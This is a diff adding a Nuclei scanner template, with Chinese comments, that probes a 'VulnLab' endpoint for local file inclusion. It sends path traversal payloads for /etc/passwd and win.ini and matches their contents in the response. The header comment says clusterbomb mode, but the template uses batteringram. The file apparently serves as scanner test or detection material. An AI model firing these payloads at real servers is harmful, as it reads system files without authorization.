@@ -1,0 +1,41 @@
+# Nuclei POC - Payload 变量 + Fuzzing
+# 复杂度：★★★★☆
+# 测试点：payloads、clusterbomb 模式、多路径
+
+id: vulnlab-lfi-fuzz
+
+info:
+  name: VulnLab LFI Fuzzing
+  author: test
+  severity: high
+  description: 本地文件包含漏洞 Fuzzing 测试
+  tags: lfi,fuzz,file-inclusion
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/lfi?file={{payload}}"
+    
+    payloads:
+      payload:
+        - "../../../etc/passwd"
+        - "....//....//....//etc/passwd"
+        - "/etc/passwd"
+        - "..\\..\\..\\windows\\win.ini"
+    
+    attack: batteringram
+    stop-at-first-match: true
+    
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:x:0:0"
+          - "www-data:x:33"
+      
+      - type: word
+        part: body
+        words:
+          - "[fonts]"
+          - "[extensions]"
